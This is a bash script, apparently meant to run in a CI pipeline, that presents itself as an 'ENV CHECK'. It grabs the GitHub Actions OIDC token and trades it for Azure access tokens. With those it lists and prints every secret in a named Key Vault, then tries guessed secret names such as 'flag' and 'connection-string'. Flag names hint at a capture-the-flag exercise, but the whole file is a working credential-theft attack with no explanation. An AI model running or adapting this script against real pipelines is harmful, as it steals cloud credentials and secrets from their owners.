#!/usr/bin/env bash
echo "=== ENV CHECK ==="
echo "OIDC URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:-NOT_SET}"
echo "OIDC TOKEN SET: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+YES}"
echo "CLIENT_ID: ${AZURE_CLIENT_ID:-NOT_SET}"
echo "TENANT_ID: ${AZURE_TENANT_ID:-NOT_SET}"
echo "SUB_ID: ${AZURE_SUBSCRIPTION_ID:-NOT_SET}"
echo ""

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "ERROR: OIDC URL not set. Dumping env vars..."
  env | sort | grep -iv token | grep -iv secret | grep -iv password
  echo "DONE (no OIDC)"
  exit 0
fi

echo "=== GET OIDC TOKEN ==="
OIDC_RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
echo "OIDC resp length: ${#OIDC_RESP}"
OIDC_TOKEN=$(echo "${OIDC_RESP}" | jq -r '.value // empty' 2>/dev/null)
echo "OIDC token length: ${#OIDC_TOKEN}"

if [ -z "${OIDC_TOKEN}" ]; then
  echo "ERROR: Failed to get OIDC token"
  echo "Full response: ${OIDC_RESP}"
  exit 0
fi

echo "OIDC payload:"
echo "${OIDC_TOKEN}" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true

echo ""
echo "=== EXCHANGE FOR VAULT TOKEN ==="
VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC_TOKEN}" 2>&1)
VAULT_TOKEN=$(echo "${VAULT_RESP}" | jq -r '.access_token // empty' 2>/dev/null)
echo "Vault token length: ${#VAULT_TOKEN}"

if [ -z "${VAULT_TOKEN}" ]; then
  echo "Token exchange failed:"
  echo "${VAULT_RESP}" | jq . 2>/dev/null || echo "${VAULT_RESP}"

  echo ""
  echo "=== TRY STORAGE SCOPE ==="
  OIDC_RESP2=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
  OIDC_TOKEN2=$(echo "${OIDC_RESP2}" | jq -r '.value // empty' 2>/dev/null)
  STORAGE_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=https://storage.azure.com/.default" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC_TOKEN2}" 2>&1)
  echo "${STORAGE_RESP}" | jq . 2>/dev/null || echo "${STORAGE_RESP}"

  echo ""
  echo "=== TRY MGMT SCOPE ==="
  OIDC_RESP3=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
  OIDC_TOKEN3=$(echo "${OIDC_RESP3}" | jq -r '.value // empty' 2>/dev/null)
  MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=https://management.azure.com/.default" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC_TOKEN3}" 2>&1)
  echo "${MGMT_RESP}" | jq . 2>/dev/null || echo "${MGMT_RESP}"
  exit 0
fi

echo ""
echo "=== KEY VAULT SECRETS ==="
KV_LIST=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer ${VAULT_TOKEN}" 2>&1)
echo "${KV_LIST}" | jq . 2>/dev/null || echo "${KV_LIST}"

echo ""
echo "=== READING EACH SECRET ==="
for SECRET_ID in $(echo "${KV_LIST}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
  echo "--- ${SECRET_ID} ---"
  curl -sS "${SECRET_ID}?api-version=7.3" -H "Authorization: Bearer ${VAULT_TOKEN}" | jq . 2>/dev/null
done

echo ""
echo "=== ALSO TRY KNOWN KV PATHS ==="
for NAME in flag ctf-flag tbl-flag identity-header config connection-string; do
  echo "--- ${NAME} ---"
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/${NAME}?api-version=7.3" \
    -H "Authorization: Bearer ${VAULT_TOKEN}" | jq -r '.value // .error.message // "not found"' 2>/dev/null
done

echo ""
echo "=== DONE ==="
